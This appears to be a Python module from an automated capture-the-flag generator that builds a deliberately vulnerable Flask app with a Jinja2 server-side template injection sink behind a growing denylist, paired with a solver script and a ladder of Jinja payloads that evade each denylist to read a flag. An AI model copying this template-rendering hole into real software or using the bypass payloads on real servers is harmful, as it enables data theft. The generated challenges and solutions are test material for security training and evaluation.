"""Real Web (SSTI) category — co-evolving denylist guard. §8.2 container pipeline.

The challenge is a Flask app with a Jinja2 SSTI sink behind a denylist guard.
Difficulty escalates by GUARD SOPHISTICATION (denylist size), not entropy: each
generation bans the token the previous generation's bypass used, forcing the PoC
to a harder Jinja construct that reads the same one-entry context dict:

  gen 0  {{ctx.flag}}                 (banned next: 'flag')
  gen 1  {{ctx.values()|first}}       (banned next: 'values')
  gen 2  {{ctx.items()|first|last}}   (banned next: 'items')
  gen 3  {{ctx|dictsort|first|last}}  (banned next: 'dictsort')
  gen 4  {{ctx.popitem()[1]}}

Every generation ships a PoC that provably evades its own denylist, verified
against a LIVE server. Verification prefers Docker when available and otherwise
falls back to a local Flask process, so the category is fully checkable here.
"""
from __future__ import annotations

import hashlib
import shutil
import subprocess
import time

from .models import ChainStep, ChallengeSpec, Lineage, OfficialSolver, Verdict

_FLASK_APP = r"""
from flask import Flask, request
from jinja2 import Template
import os

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "flag{replace_at_deployment}")
CTX = {"flag": FLAG}          # single-entry context; many spellings reach the value
DENY = __DENY__               # denylist guard (grows each generation)

@app.route("/")
def index():
    name = request.args.get("name", "guest")
    for bad in DENY:
        if bad in name:
            return "blocked token: " + bad, 403
    return Template("Hello " + name + "!").render(ctx=CTX)   # SSTI sink

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=int(os.environ.get("PORT", "8000")))
"""

_DOCKERFILE = """\
FROM python:3.11-slim
RUN pip install --no-cache-dir flask==3.0.0 jinja2==3.1.2
WORKDIR /app
COPY app.py /app/app.py
ENV FLAG={flag}
EXPOSE 8000
CMD ["python", "app.py"]
"""

BASE_DENY = ["{{7*7}}", "config"]
# (token banned when advancing PAST this level, payload that reads the flag)
PAYLOAD_LADDER = [
    ("flag",     "{{ctx.flag}}"),
    ("values",   "{{ctx.values()|first}}"),
    ("items",    "{{ctx.items()|first|last}}"),
    ("dictsort", "{{ctx|dictsort|first|last}}"),
    ("popitem",  "{{ctx.popitem()[1]}}"),
]
MAX_WEB_GEN = len(PAYLOAD_LADDER) - 1


def deny_for(generation: int) -> list[str]:
    g = min(generation, MAX_WEB_GEN)
    return BASE_DENY + [PAYLOAD_LADDER[i][0] for i in range(g)]


def payload_for(generation: int) -> str:
    return PAYLOAD_LADDER[min(generation, MAX_WEB_GEN)][1]


def gen_web_ssti(*, seed: int, archetype_id: str = "web.ssti.jinja2",
                 generation: int = 0, parent_spec_id: str | None = None,
                 mutation_ops: list[str] | None = None,
                 target_solve_rate: float = 0.05) -> ChallengeSpec:
    g = min(generation, MAX_WEB_GEN)
    flag = f"flag{{{hashlib.sha256(f'ssti::{seed}'.encode()).hexdigest()[:12]}}}"
    deny = deny_for(generation)
    payload = payload_for(generation)
    expected_sha = hashlib.sha256(flag.encode()).hexdigest()
    poc = (
        "import sys, re, requests\n"
        "base = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:8000'\n"
        f"payload = {payload!r}\n"
        "r = requests.get(base, params={'name': payload}, timeout=10)\n"
        "m = re.search(r'flag\\{[0-9a-f]+\\}', r.text)\n"
        "print(m.group(0) if m else 'NO-FLAG')\n"
    )
    slug = f"web-ssti-{seed:06d}-g{generation}"
    return ChallengeSpec(
        slug=slug, title=f"SSTI Guard L{g} (Gen-{generation})", category="web",
        challenge_type="ssti", difficulty="medium" if g < 2 else "hard",
        story="A greeting service reflects your name through a template. Some tokens are filtered.",
        vulnerability=f"Jinja2 SSTI behind a {len(deny)}-token denylist guard",
        intended_solution=["evade the denylist", "reach the sink", "read the flag from context"],
        hints=["The filter is a denylist, not an allowlist.",
               "The flag lives in a one-entry context dict; there are many ways to read it."],
        delivery="web", seed=seed,
        mechanics={"build": {"engine": "docker", "port": 8000, "deny": deny},
                   "guard_tokens": len(deny), "bypass_level": g},
        flag=flag, spec_id=f"{slug}-{expected_sha[:8]}",
        lineage=Lineage(archetype_id=archetype_id, generation=generation,
                        parent_spec_id=parent_spec_id, mutation_ops=mutation_ops or [],
                        seed=seed),
        # intended_depth = level+1 drives the attacker-pool difficulty curve
        vuln_chain=[ChainStep(step=i + 1, primitive="ssti_denylist_bypass",
                              params={"deny_count": len(deny)}, guard="denylist")
                    for i in range(g + 1)],
        artifacts={
            "app.py": _FLASK_APP.replace("__DENY__", repr(deny)),
            "Dockerfile": _DOCKERFILE.replace("{flag}", flag),
            "README.md": "# SSTI\n\nRecover the flag from the greeting service.",
        },
        official_solver=OfficialSolver(entry="solver.py", files={"solver.py": poc},
                                       expected_flag_sha256=expected_sha, max_runtime_s=60),
        target_solve_rate=target_solve_rate,
    )


def mutate_web(parent: ChallengeSpec) -> ChallengeSpec:
    """Escalate the denylist by one token; re-pair the PoC to the harder bypass (P1)."""
    return gen_web_ssti(seed=parent.seed, archetype_id=parent.lineage.archetype_id,
                        generation=parent.lineage.generation + 1,
                        parent_spec_id=parent.spec_id, mutation_ops=["escalate_denylist"],
                        target_solve_rate=parent.target_solve_rate)


# ---------------------------------------------------------------------------
# Verify: prefer Docker; fall back to a local Flask process.
# ---------------------------------------------------------------------------
def docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        return subprocess.run(["docker", "info"], capture_output=True,
                              timeout=10).returncode == 0
    except Exception:
        return False


def build_and_verify_web(spec: ChallengeSpec) -> Verdict:
    return _verify_docker(spec) if docker_available() else _verify_local(spec)


def _verify_local(spec: ChallengeSpec) -> Verdict:
    import sys
    import tempfile
    from pathlib import Path

    from .localserve import free_port, http, serve_flask

    expected = spec.official_solver.expected_flag_sha256
    checks, failures = [], []
    secs = None
    with tempfile.TemporaryDirectory(prefix="autoctf-weblocal-") as tmp:
        root = Path(tmp)
        for rel, content in {**spec.artifacts, **spec.official_solver.files}.items():
            (root / rel).write_text(content, encoding="utf-8")
        leak_ok = spec.flag not in spec.artifacts["app.py"]
        checks.append("flag not hardcoded in app source") if leak_ok else \
            failures.append("flag hardcoded in source")
        port = free_port()
        proc = serve_flask(root / "app.py", spec.flag, port)
        base = f"http://127.0.0.1:{port}"
        try:
            t0 = time.monotonic()
            run = subprocess.run([sys.executable, "solver.py", base], cwd=root,
                                 capture_output=True, text=True,
                                 timeout=spec.official_solver.max_runtime_s)
            secs = time.monotonic() - t0
            recovered = run.stdout.strip()
            poc_ok = hashlib.sha256(recovered.encode()).hexdigest() == expected
            checks.append(f"PoC bypassed the guard live in {secs:.2f}s") if poc_ok else \
                failures.append(f"PoC failed against guard: {recovered[:80]}")
            normal_ok = "Hello guest!" in http(base + "/?name=guest")
            checks.append("normal greeting works") if normal_ok else \
                failures.append("normal request broken")
        finally:
            proc.terminate(); proc.wait(timeout=10)

    valid = poc_ok and leak_ok and normal_ok
    reason = "valid (local flask)" if valid else "; ".join(failures)
    spec.verification.status = "valid" if valid else "rejected"
    spec.verification.poc_passed = poc_ok
    spec.verification.leak_gates_passed = leak_ok
    spec.verification.measured_solve_time_s = secs if poc_ok else None
    spec.verification.rejection_reason = None if valid else reason
    return Verdict(valid, reason, poc_time_s=secs if poc_ok else None,
                   checks=checks, failures=failures)


def _verify_docker(spec: ChallengeSpec) -> Verdict:  # pragma: no cover - needs docker
    import sys
    import tempfile
    from pathlib import Path

    from .localserve import free_port

    expected = spec.official_solver.expected_flag_sha256
    tag = f"autoctf/{spec.slug}"
    port = free_port()
    cid = None
    checks, failures = [], []
    secs = None
    with tempfile.TemporaryDirectory(prefix="autoctf-web-") as tmp:
        root = Path(tmp)
        for rel, content in {**spec.artifacts, **spec.official_solver.files}.items():
            (root / rel).write_text(content, encoding="utf-8")
        build = subprocess.run(["docker", "build", "-q", "-t", tag, "."],
                               cwd=root, capture_output=True, text=True, timeout=300)
        if build.returncode != 0:
            return Verdict(False, "build_failed", failures=[build.stderr.strip()[:200]])
        checks.append("docker image built")
        try:
            run = subprocess.run(["docker", "run", "-d", "--rm", "-p",
                                  f"127.0.0.1:{port}:8000", tag],
                                 capture_output=True, text=True, timeout=60)
            cid = run.stdout.strip()
            time.sleep(3)
            t0 = time.monotonic()
            poc = subprocess.run([sys.executable, spec.official_solver.entry,
                                  f"http://127.0.0.1:{port}"], cwd=root,
                                 capture_output=True, text=True, timeout=spec.official_solver.max_runtime_s)
            secs = time.monotonic() - t0
            recovered = poc.stdout.strip()
            poc_ok = hashlib.sha256(recovered.encode()).hexdigest() == expected
            leak_ok = spec.flag not in root.joinpath("app.py").read_text(encoding="utf-8")
        finally:
            if cid:
                subprocess.run(["docker", "stop", cid], capture_output=True, timeout=30)
    valid = poc_ok and leak_ok
    return Verdict(valid, "valid (docker)" if valid else "; ".join(failures),
                   poc_time_s=secs, checks=checks, failures=failures)
